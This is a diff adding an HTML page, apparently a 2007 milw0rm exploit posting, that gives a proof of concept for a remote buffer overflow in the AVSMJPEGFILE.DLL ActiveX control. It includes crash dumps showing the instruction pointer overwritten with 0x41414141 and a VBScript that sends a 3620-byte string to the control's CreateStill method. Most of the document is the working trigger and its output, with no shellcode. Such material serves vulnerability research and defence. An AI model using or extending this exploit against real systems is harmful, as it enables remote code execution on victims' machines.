@@ -1,0 +1,66 @@
+<pre>
+<code><span style="font: 10pt Courier New;"><span class="general1-symbol"><body bgcolor="#E0E0E0">-------------------------------------------------------------------------------
+ <b>Online Media Technologies AVSMJPEGFILE.DLL 1.1 Remote Buffer Overflow</b>
+ url: www.avsmedia.com
+
+ Author: shinnai
+ mail: shinnai[at]autistici[dot]org
+ site: http://shinnai.altervista.org
+
+ <b><font color='red'>This was written for educational purpose. Use it at your own risk.
+ Author will be not responsible for any damage.</font></b>
+
+ <b>Technical details:
+ File: AVSMJPEGFILE.DLL
+ Ver.: 1.1.1.102</b>
+
+ Tested on Windows XP Professional SP2 all patched, with Internet Explorer 7
+ <b>Remote execution depends on Internet Explorer settings</b>
+
+ faultmon dump:
+ 09:58:13.236  pid=13E4 tid=145C  EXCEPTION (first-chance)
+              ----------------------------------------------------------------
+              Exception C0000005 (ACCESS_VIOLATION writing [41414141])
+              ----------------------------------------------------------------
+              EAX=02A31C64: 41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00
+              EBX=00001C4A: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+              ECX=41414141: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+              EDX=00001448: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+              ESP=0188C9A4: A0 3F 9B 02 41 41 41 41-41 41 41 41 41 41 41 41
+              EBP=0188EE08: 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41
+              ESI=00000A25: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+              EDI=029B3FA0: 41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00
+              EIP=02BF3604: 89 01 E8 0F D6 03 00 83-C4 04 33 C0 8D A5 EC F7
+                            --> MOV [ECX],EAX
+              ----------------------------------------------------------------
+
+09:58:13.252  pid=13E4 tid=145C  EXCEPTION (first-chance)
+              ----------------------------------------------------------------
+              Exception C0000005 (ACCESS_VIOLATION reading [41414141])
+              ----------------------------------------------------------------
+              EAX=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+              EBX=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+              ECX=41414141: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+              EDX=7C9137D8: 8B 4C 24 04 F7 41 04 06-00 00 00 B8 01 00 00 00
+              ESP=0188C5D4: BF 37 91 7C BC C6 88 01-80 F2 88 01 D8 C6 88 01
+              EBP=0188C5F4: A4 C6 88 01 8B 37 91 7C-BC C6 88 01 80 F2 88 01
+              ESI=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+              EDI=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+              EIP=41414141: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+                            --> N/A
+              ----------------------------------------------------------------
+-------------------------------------------------------------------------------
+<object classid='clsid:4CF945DB-7D52-437B-AD30-185336B44C74' id='test'></object>
+
+<input language=VBScript onclick=tryMe() type=button value='Click here to start the test'>
+
+<script language='vbscript'>
+ Sub tryMe
+  buff = String(3620, "A")
+  test.CreateStill buff, 1, True
+ End Sub
+</script>
+</span></span>
+</code></pre>
+
+# milw0rm.com [2007-12-11]
